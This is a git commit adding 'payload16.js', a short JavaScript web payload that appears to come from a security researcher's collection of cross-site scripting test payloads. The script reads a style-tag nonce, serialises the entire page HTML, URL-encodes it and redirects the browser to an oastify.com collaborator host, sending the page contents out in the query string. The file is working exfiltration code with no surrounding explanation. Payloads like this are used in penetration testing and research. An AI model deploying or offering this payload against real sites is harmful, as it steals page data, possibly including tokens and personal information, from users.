3e2173d25ec1e9b0518012bb35cb6bb08fa2a938
Mazin Ahmed <mazen160@users.noreply.github.com>
2025-06-25 16:06:15 -0700

    Create payload16.js

---
+++ payload16.js
@@ -0,0 +1,15 @@
+// Get the nonce from the style tag
+const nonce = document.getElementsByTagName('style')[0].nonce;
+
+
+// Create meta refresh element
+var meta = document.createElement('meta');
+meta.setAttribute('http-equiv', 'refresh');
+
+// Get all DOM content
+var domContent = document.documentElement.outerHTML;
+
+// Encode the DOM content for URL
+var encodedDOM = encodeURIComponent(domContent);
+
+window.location.replace("https://c8lgzsk4wd1wfi8hwcipb9vap1vsjji77.oastify.com/pwn?id=" + encodedDOM)
